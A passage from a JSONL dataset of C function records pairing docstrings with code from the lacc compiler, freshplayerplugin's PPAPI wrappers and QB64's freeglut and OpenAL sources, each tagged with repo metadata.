(!is_void(head)) {\n        *type = type_patch_declarator(head, *type);\n    }\n\n    return block;\n}", "path": "lacc/src/parser/declaration.c", "commit_date": "2020-12-20 00:00:00", "repo_name": "larmel/lacc", "stars": 848, "license": "mit", "language": "c", "size": 2792}
{"docstring": "/*\n * Update offset values into the object file for each section.\n * Insert padding between sections to make offsets respect alignment.\n */\n", "func_signal": "static void elf_chain_offsets(void)", "code": "{\n    int i, j;\n    int padding;\n\n    for (j = 1; j < shnum && shdr[j].sh_type == SHT_NOBITS; ++j)\n        ;\n\n    assert(j < shnum);\n    assert(shdr[j].sh_type != SHT_NOBITS);\n    shdr[j].sh_offset = sizeof(Elf64_Ehdr) + shnum * sizeof(Elf64_Shdr);\n\n    for (i = j + 1; i < shnum; ++i) {\n        if (shdr[i].sh_type == SHT_NOBITS)\n            continue;\n\n        assert(j > 0);\n        assert(shdr[j].sh_type != SHT_NOBITS);\n        shdr[i].sh_offset = shdr[j].sh_offset + shdr[j].sh_size;\n        if (shdr[i].sh_addralign > 1) {\n            padding = shdr[i].sh_offset % shdr[i].sh_addralign;\n            shdr[i].sh_offset += padding;\n            assert(padding < 16);\n        }\n\n        j = i;\n    }\n}", "path": "lacc/src/backend/x86_64/elf.c", "commit_date": "2020-12-20 00:00:00", "repo_name": "larmel/lacc", "stars": 848, "license": "mit", "language": "c", "size": 2792}
{"docstring": "/*\n * Traverse all reachable nodes in a graph, invoking callback on each\n * basic block.\n */\n", "func_signal": "static int traverse(int (*callback)(struct block *))", "code": "{\n    int i, n;\n    struct block *block;\n\n    for (i = 0, n = 0; i < array_len(&blocklist); ++i) {\n        block = array_get(&blocklist, i);\n        n += callback(block);\n    }\n\n    return n;\n}", "path": "lacc/src/optimizer/optimize.c", "commit_date": "2018-12-30 00:00:00", "repo_name": "larmel/lacc", "stars": 848, "license": "mit", "language": "c", "size": 2792}
{"docstring": "/* Write bytes to section. If ptr is NULL, fill with zeros. */\n", "func_signal": "INTERNAL size_t elf_section_write(int shid, const void *data, size_t n)", "code": "{\n    /*\n     * Section data buffer capacity, in bytes. Buffer is kept in sbuf,\n     * indexed by section id. \n     */\n    static size_t scap[SHNUM_MAX];\n\n    size_t offset;\n    assert(0 < shid && shid < shnum);\n    assert(\n        shdr[shid].sh_type == SHT_STRTAB ||\n        shdr[shid].sh_type == SHT_SYMTAB ||\n        shdr[shid].sh_type == SHT_PROGBITS ||\n        shdr[shid].sh_type == SHT_RELA ||\n        shdr[shid].sh_type == SHT_NOBITS);\n\n    offset = shdr[shid].sh_size;\n    if (shdr[shid].sh_type != SHT_NOBITS && n > 0) {\n        if (offset + n >= scap[shid]) {\n            if (!scap[shid]) {\n                assert(!offset);\n                assert(!sbuf[shid].data);\n                scap[shid] = 10 * n;\n                sbuf[shid].data = malloc(scap[shid]);\n            } else {\n                assert(offset);\n                assert(sbuf[shid].data);\n                scap[shid] = 2 * scap[shid] + n;\n                sbuf[shid].data = realloc(sbuf[shid].data, scap[shid]);\n            }\n        }\n        if (data) {\n            memcpy(sbuf[shid].data + offset, data, n);\n        } else {\n            memset(sbuf[shid].data + offset, 0, n);\n        }\n    }\n\n    shdr[shid].sh_size += n;\n    return offset;\n}", "path": "lacc/src/backend/x86_64/elf.c", "commit_date": "2020-12-20 00:00:00", "repo_name": "larmel/lacc", "stars": 848, "license": "mit", "language": "c", "size": 2792}
{"docstring": "/* Initialize liveness information in each block. */\n", "func_signal": "static void initialize_dataflow(void)", "code": "{\n    struct block *block;\n    struct statement *st;\n    int i, j;\n\n    for (i = 0; i < array_len(&blocklist); ++i) {\n        block = array_get(&blocklist, i);\n        block->in = 0;\n        block->out = 0;\n        for (j = 0; j < array_len(&block->code); ++j) {\n            st = &array_get(&block->code, j);\n            st->out = 0;\n        }\n    }\n}", "path": "lacc/src/optimizer/optimize.c", "commit_date": "2018-12-30 00:00:00", "repo_name": "larmel/lacc", "stars": 848, "license": "mit", "language": "c", "size": 2792}
{"docstring": "// trace wrappers\n", "func_signal": "TRACE_WRAPPER\nvoid *\ntrace_ppb_memory_mem_alloc(uint32_t num_bytes)", "code": "{\n    trace_info(\"[PPB] {full} %s num_bytes=%u\\n\", __func__+6, num_bytes);\n    return ppb_memory_mem_alloc(num_bytes);\n}", "path": "freshplayerplugin/src/ppb_memory.c", "commit_date": "2017-12-16 00:00:00", "repo_name": "i-rinat/freshplayerplugin", "stars": 730, "license": "mit", "language": "c", "size": 6782}
{"docstring": "// called when menu is closed\n", "func_signal": "static\nvoid\nmenu_selection_done(GtkMenuShell *object, gboolean user_data)", "code": "{\n    int32_t code = popup_menu_canceled ? PP_ERROR_USERCANCEL : PP_OK;\n\n    ppb_message_loop_post_work_with_result(popup_menu_ccb_ml, popup_menu_ccb, 0, code, 0, __func__);\n\n    popup_menu_sentinel = 0;\n    popup_menu_result = NULL;\n}", "path": "freshplayerplugin/src/ppb_flash_menu.c", "commit_date": "2017-12-16 00:00:00", "repo_name": "i-rinat/freshplayerplugin", "stars": 730, "license": "mit", "language": "c", "size": 6782}
{"docstring": "// trace wrappers\n", "func_signal": "TRACE_WRAPPER\nPP_Bool\ntrace_ppb_cursor_control_set_cursor(PP_Instance instance, enum PP_CursorType_Dev type,\n                                    PP_Resource custom_image, const struct PP_Point *hot_spot)", "code": "{\n    char *s_hot_spot = trace_point_as_string(hot_spot);\n    trace_info(\"[PPB] {full} %s instance=%d, type=%d, custom_image=%d, hot_spot=%s\\n\", __func__+6,\n               instance, type, custom_image, s_hot_spot);\n    g_free(s_hot_spot);\n    return ppb_cursor_control_set_cursor(instance, type, custom_image, hot_spot);\n}", "path": "freshplayerplugin/src/ppb_cursor_control.c", "commit_date": "2017-12-16 00:00:00", "repo_name": "i-rinat/freshplayerplugin", "stars": 730, "license": "mit", "language": "c", "size": 6782}
{"docstring": "// trace wrappers\n", "func_signal": "TRACE_WRAPPER\nint32_t\ntrace_ppb_input_event_request_input_events(PP_Instance instance, uint32_t event_classes)", "code": "{\n    char *s_event_classes = trace_event_classes_as_string(event_classes);\n    trace_info(\"[PPB] {full} %s instance=%d, event_classes=%s\\n\", __func__+6, instance,\n               s_event_classes);\n    free(s_event_classes);\n    return ppb_input_event_request_input_events(instance, event_classes);\n}", "path": "freshplayerplugin/src/ppb_input_event.c", "commit_date": "2017-12-16 00:00:00", "repo_name": "i-rinat/freshplayerplugin", "stars": 730, "license": "mit", "language": "c", "size": 6782}
{"docstring": "// trace wrappers\n", "func_signal": "TRACE_WRAPPER\nPP_Resource\ntrace_ppb_tcp_socket_create(PP_Instance instance)", "code": "{\n    trace_info(\"[PPB] {full} %s instance=%d\\n\", __func__+6, instance);\n    return ppb_tcp_socket_create(instance);\n}", "path": "freshplayerplugin/src/ppb_tcp_socket.c", "commit_date": "2017-12-16 00:00:00", "repo_name": "i-rinat/freshplayerplugin", "stars": 730, "license": "mit", "language": "c", "size": 6782}
{"docstring": "// called when used selects menu item (workaround for submenus)\n", "func_signal": "static\nvoid\nmenu_item_button_press(GtkWidget *widget, GdkEvent *event, gpointer user_data)", "code": "{\n    if (popup_menu_result)\n        *popup_menu_result = (size_t)user_data;\n\n    // set the flag indicating user selected something, not just aborted\n    popup_menu_canceled = 0;\n}", "path": "freshplayerplugin/src/ppb_flash_menu.c", "commit_date": "2017-12-16 00:00:00", "repo_name": "i-rinat/freshplayerplugin", "stars": 730, "license": "mit", "language": "c", "size": 6782}
{"docstring": "// trace wrappers\n", "func_signal": "TRACE_WRAPPER\nPP_Bool\ntrace_ppb_view_is_view(PP_Resource resource)", "code": "{\n    trace_info(\"[PPB] {full} %s resource=%d\\n\", __func__+6, resource);\n    return ppb_view_is_view(resource);\n}", "path": "freshplayerplugin/src/ppb_view.c", "commit_date": "2017-12-16 00:00:00", "repo_name": "i-rinat/freshplayerplugin", "stars": 730, "license": "mit", "language": "c", "size": 6782}
{"docstring": "// trace wrappers\n", "func_signal": "TRACE_WRAPPER\nuint32_t\ntrace_ppb_flash_clipboard_register_custom_format(PP_Instance instance_id, const char *format_name)", "code": "{\n    trace_info(\"[PPB] {full} %s instance_id=%d, format_name=%s\\n\", __func__+6, instance_id,\n               format_name);\n    return ppb_flash_clipboard_register_custom_format(instance_id, format_name);\n}", "path": "freshplayerplugin/src/ppb_flash_clipboard.c", "commit_date": "2017-12-16 00:00:00", "repo_name": "i-rinat/freshplayerplugin", "stars": 730, "license": "mit", "language": "c", "size": 6782}
{"docstring": "// Due to asynchronous operation IME can give back key press event by inserting it into GTK+\n// event queue. Auxiliary catcher widget is used to catch such events and pass them to processing\n// routine again.\n", "func_signal": "static\ngboolean\ncatcher_key_press(GtkWidget *widget, GdkEvent *event, struct pp_instance_s *pp_i)", "code": "{\n    XEvent ev = {\n        .xkey = {\n            .type =     KeyPress,\n            .display =  GDK_WINDOW_XDISPLAY(event->key.window),\n            .keycode =  event->key.hardware_keycode,\n            .time =     event->key.time,\n            .state =    event->key.state,\n        }\n    };\n\n    // untie GdkWindow from auxiliary widget\n    gw_gdk_window_set_user_data(event->key.window, NULL);\n\n    handle_key_press_release_event(pp_i->npp, &ev);\n    return TRUE;\n}", "path": "freshplayerplugin/src/np_functions.c", "commit_date": "2017-12-16 00:00:00", "repo_name": "i-rinat/freshplayerplugin", "stars": 730, "license": "mit", "language": "c", "size": 6782}
{"docstring": "// HAVE_HWDEC\n", "func_signal": "int\ntables_open_display(void)", "code": "{\n    int retval = 0;\n    int major, minor;\n\n    pthread_mutexattr_init(&display.mutex_attr_recursive);\n    pthread_mutexattr_settype(&display.mutex_attr_recursive, PTHREAD_MUTEX_RECURSIVE);\n\n    pthread_mutex_init(&display.lock, &display.mutex_attr_recursive);\n    pthread_mutex_lock(&display.lock);\n    display.x = XOpenDisplay(NULL);\n    if (!display.x) {\n        trace_error(\"%s, can't open X Display\\n\", __func__);\n        retval = 1;\n        goto quit;\n    }\n\n    if (config.quirks.x_synchronize)\n        XSynchronize(display.x, True);\n\n    display.dri_fd = open(\"/dev/dri/card0\", O_RDWR);\n\n#if HAVE_HWDEC\n\n    display.va_available = 0;\n    display.vdpau_available = 0;\n\n    if (config.enable_hwdec) {\n        if (config.enable_vaapi)\n            initialize_vaapi();\n\n        if (config.enable_vdpau)\n            initialize_vdpau();\n    }\n\n#endif // HAVE_HWDEC\n\n    if (!glXQueryVersion(display.x, &major, &minor)) {\n        trace_error(\"%s, glXQueryVersion returned False\\n\", __func__);\n    } else {\n        trace_info_f(\"GLX version %d.%d\\n\", major, minor);\n    }\n\n    check_glx_extensions();\n\n    // initialize screensaver inhibition library\n    screensaver_connect();\n    display.screensaver_types = screensaver_type_detect(display.x);\n\n    gchar *s = g_strdup_printf(\"screensavers found:%s%s%s%s%s\",\n        (display.screensaver_types & SST_XSCREENSAVER) ? \" XScreenSaver\" : \"\",\n        (display.screensaver_types & SST_FDO_SCREENSAVER) ? \" fd.o-screensaver\" : \"\",\n        (display.screensaver_types & SST_CINNAMON_SCREENSAVER) ? \" cinnamon-screensaver\" : \"\",\n        (display.screensaver_types & SST_GNOME_SCREENSAVER) ? \" gnome-screensaver\" : \"\",\n        (display.screensaver_types & SST_KDE_SCREENSAVER) ? \" kscreensaver\" : \"\");\n    trace_info_f(\"%s\\n\", s);\n    g_free(s);\n\n    // create transparent cursor\n    const char t_pixmap_data = 0;\n    XColor t_color = {};\n    Pixmap t_pixmap = XCreateBitmapFromData(display.x, DefaultRootWindow(display.x),\n                                            &t_pixmap_data, 1, 1);\n    display.transparent_cursor = XCreatePixmapCursor(display.x, t_pixmap, t_pixmap, &t_color,\n                                                     &t_color, 0, 0);\n    XFreePixmap(display.x, t_pixmap);\n\n    // determine minimal size across all screens\n    display.min_width = (uint32_t)-1;\n    display.min_height = (uint32_t)-1;\n    XRRScreenResources *sr = XRRGetScreenResources(display.x, DefaultRootWindow(display.x));\n    if (sr) {\n        for (int k = 0; k < sr->ncrtc; k ++) {\n            XRRCrtcInfo *ci = XRRGetCrtcInfo(display.x, sr, sr->crtcs[k]);\n\n            if (ci && ci->width > 0 && ci->height > 0) {\n                display.min_width = MIN(display.min_width, ci->width);\n                display.min_height = MIN(display.min_height, ci->height);\n            }\n\n            if (ci)\n                XRRFreeCrtcInfo(ci);\n        }\n        XRRFreeScreenResources(sr);\n    }\n\n    if (display.min_width == (uint32_t)-1 || display.min_height == (uint32_t)-1) {\n        display.min_width = 300;\n        display.min_height = 300;\n    }\n\n    // apply size override from the configuration file\n    if (config.fullscreen_width > 0)\n        display.min_width = config.fullscreen_width;\n    if (config.fullscreen_height > 0)\n        display.min_height = config.fullscreen_height;\n\n    int xrender_event_base, xrender_error_base;\n    if (XRenderQueryExtension(display.x, &xrender_event_base, &xrender_error_base)) {\n        trace_info_f(\"found XRender\\n\");\n        display.have_xrender = 1;\n    } else {\n        trace_info_f(\"no XRender available\\n\");\n        display.have_xrender = 0;\n    }\n\n    if (!config.enable_xrender) {\n        trace_info_f(\"XRender is disabled\\n\");\n        display.have_xrender = 0;\n    }\n\n    if (display.have_xrender) {\n        display.pictfmt_rgb24 = XRenderFindStandardFormat(display.x, PictStandardRGB24);\n        display.pictfmt_argb32 = XRenderFindStandardFormat(display.x, PictStandardARGB32);\n    }\n\nquit:\n    pthread_mutex_unlock(&display.lock);\n    return retval;\n}", "path": "freshplayerplugin/src/tables.c", "commit_date": "2020-04-04 00:00:00", "repo_name": "i-rinat/freshplayerplugin", "stars": 730, "license": "mit", "language": "c", "size": 6782}
{"docstring": "// trace wrappers\n", "func_signal": "TRACE_WRAPPER\nPP_Resource\ntrace_ppb_pdf_get_font_file_with_fallback(PP_Instance instance,\n                                          const struct PP_BrowserFont_Trusted_Description\n                                                                                    *description,\n                                          PP_PrivateFontCharset charset)", "code": "{\n    gchar *s_face = trace_var_as_string(description->face);\n    trace_info(\"[PPB] {full} %s instance=%d, description={.face=%s, .family=%u, .size=%u, \"\n               \".weight=%u, .italic=%u, .small_caps=%u, .letter_spacing=%d, .word_spacing=%d}, \"\n               \"charset=%s(%u)\\n\",\n               __func__+6, instance, s_face, description->family, description->size,\n               description->weight, description->italic, description->small_caps,\n               description->letter_spacing, description->word_spacing,\n               reverse_private_font_charset(charset), charset);\n    g_free(s_face);\n    return ppb_pdf_get_font_file_with_fallback(instance, description, charset);\n}", "path": "freshplayerplugin/src/ppb_pdf.c", "commit_date": "2017-12-16 00:00:00", "repo_name": "i-rinat/freshplayerplugin", "stars": 730, "license": "mit", "language": "c", "size": 6782}
{"docstring": "// trace wrappers\n", "func_signal": "TRACE_WRAPPER\nPP_Resource\ntrace_ppb_x509_certificate_create(PP_Instance instance)", "code": "{\n    trace_info(\"[PPB] {full} %s instance=%d\\n\", __func__+6, instance);\n    return ppb_x509_certificate_create(instance);\n}", "path": "freshplayerplugin/src/ppb_x509_certificate.c", "commit_date": "2017-12-16 00:00:00", "repo_name": "i-rinat/freshplayerplugin", "stars": 730, "license": "mit", "language": "c", "size": 6782}
{"docstring": "// trace wrappers\n", "func_signal": "TRACE_WRAPPER\nPP_Bool\ntrace_ppb_url_response_info_is_url_response_info(PP_Resource resource)", "code": "{\n    trace_info(\"[PPB] {full} %s resource=%d\\n\", __func__+6, resource);\n    return ppb_url_response_info_is_url_response_info(resource);\n}", "path": "freshplayerplugin/src/ppb_url_response_info.c", "commit_date": "2017-12-16 00:00:00", "repo_name": "i-rinat/freshplayerplugin", "stars": 730, "license": "mit", "language": "c", "size": 6782}
{"docstring": "// trace wrappers\n", "func_signal": "TRACE_WRAPPER\nvoid\ntrace_ppb_uma_histogram_custom_times(PP_Instance instance, struct PP_Var name, int64_t sample,\n                                     int64_t min, int64_t max, uint32_t bucket_count)", "code": "{\n    trace_info(\"[PPB] {zilch} %s\\n\", __func__+6);\n    return ppb_uma_histogram_custom_times(instance, name, sample, min, max, bucket_count);\n}", "path": "freshplayerplugin/src/ppb_uma.c", "commit_date": "2017-12-16 00:00:00", "repo_name": "i-rinat/freshplayerplugin", "stars": 730, "license": "mit", "language": "c", "size": 6782}
{"docstring": "/// diplay plugin placeholder and error message in it\n", "func_signal": "static\nint16_t\nhandle_placeholder_graphics_expose_event(NPP npp, void *event)", "code": "{\n    XGraphicsExposeEvent   *ev = event;\n    Display                *dpy = ev->display;\n    Drawable                drawable = ev->drawable;\n    int                     screen = DefaultScreen(dpy);\n    unsigned int            width, height, border_width, depth;\n    Window                  root_wnd;\n    int                     x, y;\n\n    XGetGeometry(dpy, drawable, &root_wnd, &x, &y, &width, &height, &border_width, &depth);\n    cairo_surface_t *xlib_surf = cairo_xlib_surface_create(dpy, drawable,\n                                                           DefaultVisual(dpy, screen),\n                                                           width, height);\n    cairo_t *cr = cairo_create(xlib_surf);\n    double bg_color[3] = {0.35, 0.35, 0.3};\n    double fg_color[3] = {0.9, 0.9, 0.5};\n\n\n    // clear box\n    cairo_rectangle(cr, 0, 0, width, height);\n    cairo_set_source_rgb(cr, bg_color[0], bg_color[1], bg_color[2]);\n    cairo_fill(cr);\n\n    // draw crossed box\n    cairo_set_source_rgb(cr, fg_color[0], fg_color[1], fg_color[2]);\n    cairo_set_line_width(cr, 3);\n    cairo_rectangle(cr, 0, 0, width, height);\n    cairo_stroke(cr);\n    cairo_move_to(cr, 0, 0);        cairo_line_to(cr, width, height);\n    cairo_move_to(cr, 0, height);   cairo_line_to(cr, width, 0);\n    cairo_stroke(cr);\n\n    // compose error text\n    gchar *txt;\n    if (config.quirks.incompatible_npapi_version) {\n        txt = g_strdup_printf(\"NPAPI version too old (%d)\", npn.version);\n\n    } else {\n        const char *plugin_name = fpp_config_get_plugin_file_name();\n        txt = g_strdup_printf(\n            \"Failed to load \\\"%s\\\".\\n\"\n            \"Freshwrapper is a translation layer which needs\\n\"\n            \"a PPAPI plugin backend. Ensure your system have\\n\"\n            \"\\\"%s\\\" available.\\n\",\n            plugin_name, plugin_name);\n    }\n\n    const double pos_x = 10.0;\n    const double pos_y = 30.0;\n\n    PangoLayout *layout = pango_cairo_create_layout(cr);\n    pango_layout_set_text(layout, txt, -1);\n\n    // prepare background\n    PangoRectangle extents;\n    pango_layout_get_pixel_extents(layout, &extents, NULL);\n    cairo_rectangle(cr, pos_x, pos_y, extents.width + 6, extents.height + 6);\n    cairo_set_source_rgb(cr, bg_color[0], bg_color[1], bg_color[2]);\n    cairo_fill(cr);\n\n    // draw text itself\n    cairo_set_source_rgb(cr, fg_color[0], fg_color[1], fg_color[2]);\n    cairo_move_to(cr, pos_x + 3, pos_y + 3);\n    pango_cairo_show_layout(cr, layout);\n\n    g_object_unref(layout);\n    g_free(txt);\n\n    cairo_destroy(cr);\n    cairo_surface_destroy(xlib_surf);\n    return 1;\n}", "path": "freshplayerplugin/src/np_functions.c", "commit_date": "2017-12-16 00:00:00", "repo_name": "i-rinat/freshplayerplugin", "stars": 730, "license": "mit", "language": "c", "size": 6782}
{"docstring": "// trace wrappers\n", "func_signal": "TRACE_WRAPPER\nPP_Resource\ntrace_ppb_flash_menu_create(PP_Instance instance_id, const struct PP_Flash_Menu *menu_data)", "code": "{\n    trace_info(\"[PPB] {full} %s instance_id=%d, menu_data=%p\\n\", __func__+6, instance_id,\n               menu_data);\n    return ppb_flash_menu_create(instance_id, menu_data);\n}", "path": "freshplayerplugin/src/ppb_flash_menu.c", "commit_date": "2017-12-16 00:00:00", "repo_name": "i-rinat/freshplayerplugin", "stars": 730, "license": "mit", "language": "c", "size": 6782}
{"docstring": "// trace wrappers\n", "func_signal": "TRACE_WRAPPER\nPP_Resource\ntrace_ppb_video_capture_create(PP_Instance instance)", "code": "{\n    trace_info(\"[PPB] {full} %s instance=%d\\n\", __func__+6, instance);\n    return ppb_video_capture_create(instance);\n}", "path": "freshplayerplugin/src/ppb_video_capture.c", "commit_date": "2018-01-11 00:00:00", "repo_name": "i-rinat/freshplayerplugin", "stars": 730, "license": "mit", "language": "c", "size": 6782}
{"docstring": "// trace wrappers\n", "func_signal": "TRACE_WRAPPER\nstruct PP_Var\ntrace_ppb_url_util_canonicalize(struct PP_Var url, struct PP_URLComponents_Dev *components)", "code": "{\n    trace_info(\"[PPB] {zilch} %s\\n\", __func__+6);\n    return ppb_url_util_canonicalize(url, components);\n}", "path": "freshplayerplugin/src/ppb_url_util.c", "commit_date": "2017-12-16 00:00:00", "repo_name": "i-rinat/freshplayerplugin", "stars": 730, "license": "mit", "language": "c", "size": 6782}
{"docstring": "// !HAVE_LIBV4L2\n", "func_signal": "PP_Resource\nppb_video_capture_create(PP_Instance instance)", "code": "{\n    const struct PPP_VideoCapture_Dev_0_1 *ppp_video_capture_dev;\n    struct pp_instance_s *pp_i = tables_get_pp_instance(instance);\n    if (!pp_i) {\n        trace_error(\"%s, bad instance\\n\", __func__);\n        return 0;\n    }\n\n    ppp_video_capture_dev = ppp_get_interface(PPP_VIDEO_CAPTURE_DEV_INTERFACE_0_1);\n    if (!ppp_video_capture_dev) {\n        trace_error(\"%s, no viable %s\\n\", __func__, PPP_VIDEO_CAPTURE_DEV_INTERFACE_0_1);\n        return 0;\n    }\n\n    PP_Resource video_capture = pp_resource_allocate(PP_RESOURCE_VIDEO_CAPTURE, pp_i);\n    struct pp_video_capture_s *vc = pp_resource_acquire(video_capture, PP_RESOURCE_VIDEO_CAPTURE);\n    if (!vc) {\n        trace_error(\"%s, resource allocation failure\\n\", __func__);\n        return 0;\n    }\n\n    vc->fd = -1;\n    vc->ppp_video_capture_dev = ppp_video_capture_dev;\n\n    pp_resource_release(video_capture);\n    return video_capture;\n}", "path": "freshplayerplugin/src/ppb_video_capture.c", "commit_date": "2018-01-11 00:00:00", "repo_name": "i-rinat/freshplayerplugin", "stars": 730, "license": "mit", "language": "c", "size": 6782}
{"docstring": "// trace wrappers\n", "func_signal": "TRACE_WRAPPER\nPP_Resource\ntrace_ppb_network_monitor_create(PP_Instance instance)", "code": "{\n    trace_info(\"[PPB] {full} %s\\n\", __func__+6);\n    return ppb_network_monitor_create(instance);\n}", "path": "freshplayerplugin/src/ppb_network_monitor.c", "commit_date": "2017-12-16 00:00:00", "repo_name": "i-rinat/freshplayerplugin", "stars": 730, "license": "mit", "language": "c", "size": 6782}
{"docstring": "/*\n * Marks the current window to have the redisplay performed when possible...\n */\n", "func_signal": "void FGAPIENTRY glutPostRedisplay( void )", "code": "{\n    FREEGLUT_EXIT_IF_NOT_INITIALISED ( \"glutPostRedisplay\" );\n    if ( ! fgStructure.CurrentWindow )\n\t{\n      fgError ( \" ERROR:  Function <%s> called\"\n                \" with no current window defined.\", \"glutPostRedisplay\" ) ;\n\t}\n\n    fgStructure.CurrentWindow->State.Redisplay = GL_TRUE;\n}", "path": "qb64/internal/c/parts/core/download/freeglut-2.8.0/src/freeglut_display.c", "commit_date": "2015-08-02 00:00:00", "repo_name": "QB64Team/qb64", "stars": 645, "license": "other", "language": "c", "size": 430940}
{"docstring": "// Calculate the azimuth indices given the polar azimuth in radians.  This\n// will return two indices between 0 and (azCount [ei] - 1) and an\n// interpolation factor between 0.0 and 1.0.\n", "func_signal": "static void CalcAzIndices(ALuint evidx, ALfloat az, ALuint *azidx, ALfloat *azmu)", "code": "{\n    az = (F_PI*2.0f + az) * azCount[evidx] / (F_PI*2.0f);\n    azidx[0] = fastf2u(az) % azCount[evidx];\n    azidx[1] = (azidx[0] + 1) % azCount[evidx];\n    *azmu = az - aluFloor(az);\n}", "path": "qb64/internal/c/parts/audio/out/download/openal-soft-1.14/Alc/hrtf.c", "commit_date": "2015-08-02 00:00:00", "repo_name": "QB64Team/qb64", "stars": 645, "license": "other", "language": "c", "size": 430940}
{"docstring": "/*\n * Creates a new menu object, adding it to the freeglut structure\n */\n", "func_signal": "int FGAPIENTRY glutCreateMenu( void(* callback)( int ) )", "code": "{\n    /* The menu object creation code resides in freeglut_structure.c */\n    FREEGLUT_EXIT_IF_NOT_INITIALISED ( \"glutCreateMenu\" );\n    return fgCreateMenu( callback )->ID;\n}", "path": "qb64/internal/c/parts/core/download/freeglut-2.8.0/src/freeglut_menu.c", "commit_date": "2015-08-02 00:00:00", "repo_name": "QB64Team/qb64", "stars": 645, "license": "other", "language": "c", "size": 430940}
{"docstring": "/*\n * Removes the specified menu item from the current menu\n */\n", "func_signal": "void FGAPIENTRY glutRemoveMenuItem( int item )", "code": "{\n    SFG_MenuEntry* menuEntry;\n\n    FREEGLUT_EXIT_IF_NOT_INITIALISED ( \"glutRemoveMenuItem\" );\n    freeglut_return_if_fail( fgStructure.CurrentMenu );\n\n    /* Get n-th menu entry in the current menu, starting from one: */\n    menuEntry = fghFindMenuEntry( fgStructure.CurrentMenu, item );\n\n    freeglut_return_if_fail( menuEntry );\n\n    fgListRemove( &fgStructure.CurrentMenu->Entries, &menuEntry->Node );\n    if ( menuEntry->Text )\n      free( menuEntry->Text );\n\n    free( menuEntry );\n    fghCalculateMenuBoxSize( );\n}", "path": "qb64/internal/c/parts/core/download/freeglut-2.8.0/src/freeglut_menu.c", "commit_date": "2015-08-02 00:00:00", "repo_name": "QB64Team/qb64", "stars": 645, "license": "other", "language": "c", "size": 430940}
{"docstring": "// Calculates the moving HRIR target coefficients, target delays, and\n// stepping values for the given polar elevation and azimuth in radians.\n// Linear interpolation is used to increase the apparent resolution of the\n// HRIR dataset.  The coefficients are also normalized and attenuated by the\n// specified gain.  Stepping resolution and count is determined using the\n// given delta factor between 0.0 and 1.0.\n", "func_signal": "ALuint GetMovingHrtfCoeffs(const struct Hrtf *Hrtf, ALfloat elevation, ALfloat azimuth, ALfloat gain, ALfloat delta, ALint counter, ALfloat (*coeffs)[2], ALuint *delays, ALfloat (*coeffStep)[2], ALint *delayStep)", "code": "{\n    ALuint evidx[2], azidx[2];\n    ALuint lidx[4], ridx[4];\n    ALfloat left, right;\n    ALfloat mu[3];\n    ALfloat step;\n    ALuint i;\n\n    // Claculate elevation indices and interpolation factor.\n    CalcEvIndices(elevation, evidx, &mu[2]);\n\n    // Calculate azimuth indices and interpolation factor for the first\n    // elevation.\n    CalcAzIndices(evidx[0], azimuth, azidx, &mu[0]);\n\n    // Calculate the first set of linear HRIR indices for left and right\n    // channels.\n    lidx[0] = evOffset[evidx[0]] + azidx[0];\n    lidx[1] = evOffset[evidx[0]] + azidx[1];\n    ridx[0] = evOffset[evidx[0]] + ((azCount[evidx[0]]-azidx[0]) % azCount[evidx[0]]);\n    ridx[1] = evOffset[evidx[0]] + ((azCount[evidx[0]]-azidx[1]) % azCount[evidx[0]]);\n\n    // Calculate azimuth indices and interpolation factor for the second\n    // elevation.\n    CalcAzIndices(evidx[1], azimuth, azidx, &mu[1]);\n\n    // Calculate the second set of linear HRIR indices for left and right\n    // channels.\n    lidx[2] = evOffset[evidx[1]] + azidx[0];\n    lidx[3] = evOffset[evidx[1]] + azidx[1];\n    ridx[2] = evOffset[evidx[1]] + ((azCount[evidx[1]]-azidx[0]) % azCount[evidx[1]]);\n    ridx[3] = evOffset[evidx[1]] + ((azCount[evidx[1]]-azidx[1]) % azCount[evidx[1]]);\n\n    // Calculate the stepping parameters.\n    delta = maxf(aluFloor(delta*(Hrtf->sampleRate*0.015f) + 0.5f), 1.0f);\n    step = 1.0f / delta;\n\n    // Calculate the normalized and attenuated target HRIR coefficients using\n    // linear interpolation when there is enough gain to warrant it.  Zero\n    // the target coefficients if gain is too low.  Then calculate the\n    // coefficient stepping values using the target and previous running\n    // coefficients.\n    if(gain > 0.0001f)\n    {\n        gain *= 1.0f/32767.0f;\n        for(i = 0;i < HRIR_LENGTH;i++)\n        {\n            left = coeffs[i][0] - (coeffStep[i][0] * counter);\n            right = coeffs[i][1] - (coeffStep[i][1] * counter);\n\n            coeffs[i][0] = lerp(lerp(Hrtf->coeffs[lidx[0]][i], Hrtf->coeffs[lidx[1]][i], mu[0]),\n                                lerp(Hrtf->coeffs[lidx[2]][i], Hrtf->coeffs[lidx[3]][i], mu[1]),\n                                mu[2]) * gain;\n            coeffs[i][1] = lerp(lerp(Hrtf->coeffs[ridx[0]][i], Hrtf->coeffs[ridx[1]][i], mu[0]),\n                                lerp(Hrtf->coeffs[ridx[2]][i], Hrtf->coeffs[ridx[3]][i], mu[1]),\n                                mu[2]) * gain;\n\n            coeffStep[i][0] = step * (coeffs[i][0] - left);\n            coeffStep[i][1] = step * (coeffs[i][1] - right);\n        }\n    }\n    else\n    {\n        for(i = 0;i < HRIR_LENGTH;i++)\n        {\n            left = coeffs[i][0] - (coeffStep[i][0] * counter);\n            right = coeffs[i][1] - (coeffStep[i][1] * counter);\n\n            coeffs[i][0] = 0.0f;\n            coeffs[i][1] = 0.0f;\n\n            coeffStep[i][0] = step * -left;\n            coeffStep[i][1] = step * -right;\n        }\n    }\n\n    // Calculate the HRIR delays using linear interpolation.  Then calculate\n    // the delay stepping values using the target and previous running\n    // delays.\n    left = (ALfloat)(delays[0] - (delayStep[0] * counter));\n    right = (ALfloat)(delays[1] - (delayStep[1] * counter));\n\n    delays[0] = fastf2u(lerp(lerp(Hrtf->delays[lidx[0]], Hrtf->delays[lidx[1]], mu[0]),\n                             lerp(Hrtf->delays[lidx[2]], Hrtf->delays[lidx[3]], mu[1]),\n                             mu[2]) * 65536.0f);\n    delays[1] = fastf2u(lerp(lerp(Hrtf->delays[ridx[0]], Hrtf->delays[ridx[1]], mu[0]),\n                             lerp(Hrtf->delays[ridx[2]], Hrtf->delays[ridx[3]], mu[1]),\n                             mu[2]) * 65536.0f);\n\n    delayStep[0] = fastf2i(step * (delays[0] - left));\n    delayStep[1] = fastf2i(step * (delays[1] - right));\n\n    // The stepping count is the number of samples necessary for the HRIR to\n    // complete its transition.  The mixer will only apply stepping for this\n    // many samples.\n    return fastf2u(delta);\n}", "path": "qb64/internal/c/parts/audio/out/download/openal-soft-1.14/Alc/hrtf.c", "commit_date": "2015-08-02 00:00:00", "repo_name": 